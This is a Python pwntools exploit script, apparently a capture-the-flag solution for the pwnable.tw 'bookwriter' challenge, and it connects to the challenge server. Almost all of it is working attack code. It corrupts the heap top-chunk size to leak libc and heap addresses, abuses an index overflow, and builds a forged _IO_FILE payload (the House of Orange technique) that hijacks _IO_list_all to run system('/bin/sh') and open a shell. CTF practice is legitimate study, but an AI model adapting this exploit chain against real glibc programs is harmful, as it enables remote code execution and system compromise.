#!/usr/bin/env python2
from pwn import *
import sys

#MyTemplate
elf = ELF("./bookwriter")
libc = ELF("./libc_64.so.6")
# ld = ELF("./ld-2.23.so")

lokal = False
context.binary = elf
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False

if lokal:
    xp = elf.process()
    libc = elf.libc
else:
    host = 'chall.pwnable.tw'
    port = '10304'
    xp = remote(host,port)

if Debug:
    context.terminal = ["tmux","splitw","-h"]
    cmd = ""
    gdb.attach(xp,cmd)


#Exploit Here
def add(size,content):
	sla("choice :","1")
	sla("page :",str(size))
	sa("Content :",content)

def view(idx):
	sla("choice :","2")
	sla("page :",str(idx))

def edit(idx,content):
	sla("choice :","3")
	sla("page :",str(idx))
	sa("Content:",content)

def info(change=0,author=''):
	sla("choice :","4")
	if change == 1:
		sla("0) ","1")
		sa("Author :",author)
	else:
		ru("Author : ")
		data = xp.recvline()[:-1]
		sla("0) ","0")
		return data

sa("Author :","A"*0x40)

add(24,"AAAA")
edit(0,"A"*24)
edit(0,"\x00"*24 + p64(0xfe1))
"""
When user malloc a chunk whose size is larger than top chunk, the program will call sysmalloc()
and free the top chunk into unsorted bin. Then the top chunk fd and bk will point to the address
which is relevant with main_arena.
"""

""" trigger free in sysmalloc, now the top chunk size is 0xfe1"""
add(0x1000,"BBBB")
add(16,"CCCCCCCC")

view(2)
ru("C"*8)
leak = uu64(xp.recvline()[:-1])
print hex(leak)

libc.address = leak  - 0x3c3b20 + 1640 - 0xcd0
print hex(libc.address)
system = libc.symbols['system']
IO_list_all = libc.symbols['_IO_list_all']

"""

"""


heap = info().replace("A","")
heap = uu64(heap)
print hex(heap)

"""Index overflow, the size of chunk[0] will be changed to heap address"""
for i in range(6):
	add(32, 'A' * 32)



payload = ''
payload += p64(0) * 42
payload += '/bin/sh\x00' + p64(0x61)
payload += p64(0) + p64(IO_list_all - 0x10)
payload += p64(0) * 11
payload += p64(system)
payload += p64(0) * 4
payload += p64(heap + 0x1e0) #lock
payload += p64(2) + p64(3) + p64(0) + p64(1)
payload += p64(0) * 2
payload += p64(heap + 0x1b0)

edit(0, payload)





xp.interactive()
